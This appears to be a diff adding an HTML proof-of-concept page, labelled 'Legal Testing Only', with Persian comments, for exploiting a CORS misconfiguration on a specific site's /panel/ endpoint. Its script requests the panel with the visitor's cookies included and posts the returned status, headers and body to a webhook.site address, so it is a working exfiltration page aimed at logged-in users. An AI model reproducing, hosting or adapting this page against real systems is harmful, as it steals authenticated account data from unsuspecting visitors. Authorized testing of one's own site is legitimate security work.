@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>CORS PoC (Legal Testing Only)</h2>
+
+<script>
+var target = "https://nikogem.com/panel/";   // آدرس API سایت خودت
+var webhook = "https://webhook.site/5e0f396e-0598-40c2-9f9e-66e70d3a264e";          // آدرس webhook شما
+
+fetch(target, {
+    method: "GET",
+    credentials: "include"
+})
+.then(async res => {
+    let text = await res.text();
+
+    // ارسال نتیجه تست به وب‌هوک (فقط برای تست خودت)
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            status: res.status,
+            headers: [...res.headers.entries()],
+            response: text
+        })
+    });
+
+    document.body.innerHTML += "<pre>" + text + "</pre>";
+})
+.catch(err => {
+    document.body.innerHTML += "<pre>Error: " + err + "</pre>";
+});
+</script>
+
+</body>
+</html>
